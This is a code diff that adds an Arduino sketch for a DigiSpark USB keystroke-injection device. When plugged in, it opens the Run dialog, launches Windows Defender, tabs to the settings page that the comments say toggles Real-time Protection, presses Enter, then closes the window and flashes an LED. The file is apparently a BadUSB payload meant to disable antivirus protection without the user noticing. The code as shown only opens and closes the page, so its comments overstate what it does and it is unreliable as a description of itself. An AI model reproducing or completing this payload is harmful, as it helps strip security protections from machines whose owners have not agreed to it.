@@ -1,0 +1,43 @@
+#include "DigiKeyboard.h"
+
+// Function to flash LED when script completes
+void flashLED(int times) {
+  for (int i = 0; i < times; i++) {
+    pinMode(1, OUTPUT);        // Set LED pin as output (Pin 1)
+    digitalWrite(1, HIGH);     // Turn on LED
+    delay(200);                // Wait 200ms
+    digitalWrite(1, LOW);      // Turn off LED
+    delay(200);                // Wait 200ms
+  }
+}
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0); // Wake up the device
+
+// Open the Run dialog
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows key + R to open Run
+  DigiKeyboard.delay(200); // Wait for the Run dialog to open
+
+  // Type "windowsdefender://" to open Windows Defender
+  DigiKeyboard.print("windowsdefender://");
+  DigiKeyboard.delay(200); // Wait for it to process
+  
+  // Press Enter to open Windows Defender
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000); // Wait for Windows Defender to open
+
+  // Tab through to 'Manage Settings' (to toggle Real-time Protection)
+  DigiKeyboard.sendKeyStroke(0x2B);  // Tab 1
+  DigiKeyboard.delay(200);           // Wait for UI to catch up
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(4500);           // Wait for Manage Settings to open
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+  DigiKeyboard.delay(800);
+
+  flashLED(2);
+
+}
+
+void loop() {
+  // Empty loop since the action is handled in setup()
+}
